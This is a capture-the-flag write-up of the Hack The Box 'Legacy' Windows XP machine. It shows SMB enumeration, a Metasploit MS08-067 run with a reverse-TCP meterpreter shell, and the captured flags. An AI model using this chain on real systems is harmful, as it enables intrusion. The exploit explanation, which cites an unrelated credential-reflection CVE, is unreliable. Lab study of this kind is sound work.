---
date: 2024-06-21
title: Legacy HTB Write-Up
machine_ip: 10.10.10.4
os: Windows
difficulty: Easy
my_rating: 3
tags:
  - RCE
  - SMB
  - EternalBlue
references: "[[📚CTF Box Writeups]]"
---
# Enumeration

```
┌─(~/Documents/Boxes/Legacy)─────────────────────────────(kali@kali:pts/6)─┐
└─(18:56:12)──> nmap -p- -T4 -A 10.10.10.4                   ──(Fri,Jun21)─┘
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 18:56 PDT
Warning: 10.10.10.4 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.4
Host is up (0.10s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE    SERVICE      VERSION
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds Windows XP microsoft-ds
18094/tcp filtered unknown
37490/tcp filtered unknown
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:dd:b1 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-06-27T07:06:02+03:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m34s, deviation: 2h07m16s, median: 4d22h57m34s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 726.58 seconds
```

We see that RPC, SMB and two unknown ports are open. SMB is usually vulnerable only older systems. 
crackmapexec smb command to find out more:

```
┌─(~/Documents/Boxes/Legacy)─────────────────────────────(kali@kali:pts/5)─┐
└─(19:04:49)──> crackmapexec smb 10.10.10.4 --shares -u '' -p ''
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB         10.10.10.4      445    LEGACY           [+] legacy\: 
SMB         10.10.10.4      445    LEGACY           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
 
 enum4linux to find more information:

```
┌─(/opt/enum4linux-ng)───────────────────────────────────(kali@kali:pts/2)─┐
└─(19:06:43)──> ./enum4linux-ng.py 10.10.10.4 -A             ──(Fri,Jun21)─┘
ENUM4LINUX - next generation (v1.3.3)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.10.4
[*] Username ......... ''
[*] Random Username .. 'pqayxyzr'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ===================================
|    Listener Scan on 10.10.10.4    |
 ===================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =========================================================
|    NetBIOS Names and Workgroup/Domain for 10.10.10.4    |
 =========================================================
[+] Got domain/workgroup name: HTB
[+] Full NetBIOS names information:
- LEGACY          <00> -         B <ACTIVE>  Workstation Service             
- LEGACY          <20> -         B <ACTIVE>  File Server Service             
- HTB             <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name           
- HTB             <1e> - <GROUP> B <ACTIVE>  Browser Service Elections       
- HTB             <1d> -         B <ACTIVE>  Master Browser                  
- ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser                  
- MAC Address = 00-50-56-B0-DD-B1                                            

 =======================================
|    SMB Dialect Check on 10.10.10.4    |
 =======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                          
  SMB 1.0: true                                                              
  SMB 2.02: false                                                            
  SMB 2.1: false                                                             
  SMB 3.0: false                                                             
  SMB 3.1.1: false                                                           
Preferred dialect: SMB 1.0                                                   
SMB1 only: true                                                              
SMB signing required: false                                                  
[*] Enforcing legacy SMBv1 for further enumeration

 =========================================================
|    Domain Information via SMB session for 10.10.10.4    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: LEGACY                                                
NetBIOS domain name: ''                                                      
DNS domain: legacy                                                           
FQDN: legacy                                                                 
Derived membership: workgroup member                                         
Derived domain: unknown                                                      

 =======================================
|    RPC Session Check on 10.10.10.4    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 =================================================
|    Domain Information via RPC for 10.10.10.4    |
 =================================================
[-] Could not get domain information via 'lsaquery': STATUS_ACCESS_DENIED

 =============================================
|    OS Information via RPC for 10.10.10.4    |
 =============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 5.1                                                              
OS version: '5.1'                                                            
OS release: not supported                                                    
OS build: not supported                                                      
Native OS: Windows 5.1                                                       
Native LAN manager: Windows 2000 LAN Manager                                 
Platform id: null                                                            
Server type: null                                                            
Server type string: null                                                     

 ===================================
|    Users via RPC on 10.10.10.4    |
 ===================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ====================================
|    Groups via RPC on 10.10.10.4    |
 ====================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ====================================
|    Shares via RPC on 10.10.10.4    |
 ====================================
[-] Could not list shares: STATUS_ACCESS_DENIED

 =======================================
|    Policies via RPC for 10.10.10.4    |
 =======================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 =======================================
|    Printers via RPC for 10.10.10.4    |
 =======================================
[+] No printers returned (this is not an error)

Completed after 33.89 seconds
```

No shares are listed. Not giving up on SMB, we can try exploits for it in msf.

# Exploit

After trying a handful of SMB exploits in MSF, CVE-2008-4037 ended up providing a shell.  It allows remote SMB servers to execute arbitrary code on a client machine by replaying the NTLM credentials of a client user.

Here’s how it works:
- An attacker can send a specially crafted SMB request to a vulnerable Windows system.
- The system will respond with the NTLM credentials of the client user, which are then replayed by the attacker to authenticate as the client user on the SMB server.
- The attacker can then execute arbitrary code on the client machine, allowing them to gain unauthorized access and potentially take control of the system.

This vulnerability is known as the “SMB Credential Reflection Vulnerability” and was discovered by the backrush research team. It affects various versions of Windows, including Windows 2000, XP, Server 2003, Vista, and Server 2008.

```
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.95.130   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms08_067_netapi) > setg LHOST tun0
LHOST => tun0
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4                                                                                                                                        
msf6 exploit(windows/smb/ms08_067_netapi) > run                                                                                                             
                                                                                                                                                            
[*] Started reverse TCP handler on 10.10.14.53:4444                                                                                                         
[*] 10.10.10.4:445 - Automatically detecting the target...                                                                                                  
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English                                                                                
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)                                                                                  
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...                                                                                             
[*] Sending stage (176198 bytes) to 10.10.10.4                                                                                                              
[*] Meterpreter session 1 opened (10.10.14.53:4444 -> 10.10.10.4:1039) at 2024-06-21 20:08:23 -0700                                                         
                                                                                                                                                            
meterpreter > shell                                                                                                                                         
Process 612 created.                                                                                                                                        
Channel 1 created.                                                                                                                                          
Microsoft Windows XP [Version 5.1.2600]                                                                                                                     
(C) Copyright 1985-2001 Microsoft Corp.                                                                                                                     
                                                                                                                                                            
C:\WINDOWS\system32>
```

This exploit provided us with access to NT AUTHORITY\SYSTEM, giving us full access to the system. A quick navigation provided us with the user and root flags:

User Flag:
```
 Directory of C:\Documents and Settings\john

16/03/2017  08:33 ��    <DIR>          .
16/03/2017  08:33 ��    <DIR>          ..
16/03/2017  09:19 ��    <DIR>          Desktop
16/03/2017  08:33 ��    <DIR>          Favorites
16/03/2017  08:33 ��    <DIR>          My Documents
16/03/2017  08:20 ��    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.403.993.600 bytes free

C:\Documents and Settings\john>cd Desktop
cd Desktop

C:\Documents and Settings\john\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19 ��    <DIR>          .
16/03/2017  09:19 ��    <DIR>          ..
16/03/2017  09:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.403.993.600 bytes free

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
C:\Documents and Settings\john\Desktop>
```


Root Flag:

``` Directory of C:\Documents and Settings

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:07 ��    <DIR>          Administrator
16/03/2017  08:29 ��    <DIR>          All Users
16/03/2017  08:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.404.001.792 bytes free

C:\Documents and Settings>cd Administrator
cd Administrator

C:\Documents and Settings\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:18 ��    <DIR>          Desktop
16/03/2017  09:07 ��    <DIR>          Favorites
16/03/2017  09:07 ��    <DIR>          My Documents
16/03/2017  08:20 ��    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.404.001.792 bytes free

C:\Documents and Settings\Administrator>cd Desktop
cd Desktop

C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18 ��    <DIR>          .
16/03/2017  09:18 ��    <DIR>          ..
16/03/2017  09:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.404.001.792 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
```

This box appears to also be vulnerable to the eternal blue exploit MS17_010. Specifically the psexec exploit.